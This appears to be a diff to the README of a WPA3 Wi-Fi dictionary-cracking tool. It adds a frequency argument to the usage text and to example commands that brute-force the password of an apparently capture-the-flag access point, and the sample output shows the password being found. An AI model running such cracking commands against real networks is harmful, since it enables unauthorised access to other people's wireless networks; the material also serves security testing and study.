@@ -110,7 +110,7 @@ The wacker.py script is intended to perform all the heavy lifting.
 ```
 # ./wacker.py --help
 usage: wacker.py [-h] --wordlist WORDLIST --interface INTERFACE --bssid BSSID
-                 --ssid SSID [--start START_WORD]
+                 --ssid SSID --freq FREQ [--start START_WORD]
 
 A WPA3 dictionary cracker. Must run as root!
 
@@ -121,11 +121,12 @@ optional arguments:
                         interface to use
   --bssid BSSID         bssid of the target
   --ssid SSID           the ssid of the WPA3 AP
+  --freq FREQ           frequency of the ap
   --start START_WORD    word to start with in the wordlist
 ```
-With any luck... running the attack using just instance...
+With any luck... running the attack using just one instance...
 ```
-# ./wacker.py --wordlist cyberpunk.words --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan1
+# ./wacker.py --wordlist cyberpunk.words --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan1 --freq 2412
 Starting wpa_supplicant...
      5796 / 509152 words :  64.33 words/sec :  7824 secs to exhaust : word = Aeromechanics
 Found the password: 'Aeromechanics'
@@ -135,9 +136,9 @@ Time elapsed : 90.0927004814148 seconds
 
 Running multiple instances of wacker is easy if you have the spare nics. Don't forget to parition the wordlist as well.
 ```
-# ./wacker.py --wordlist cyberpunk.words.aaa --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan1
-# ./wacker.py --wordlist cyberpunk.words.aab --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan2
-# ./wacker.py --wordlist cyberpunk.words.aac --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan3
+# ./wacker.py --wordlist cyberpunk.words.aaa --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan1 --freq 2412
+# ./wacker.py --wordlist cyberpunk.words.aab --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan2 --freq 2412
+# ./wacker.py --wordlist cyberpunk.words.aac --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan3 --freq 2412
 ```
 
 # Files of interest
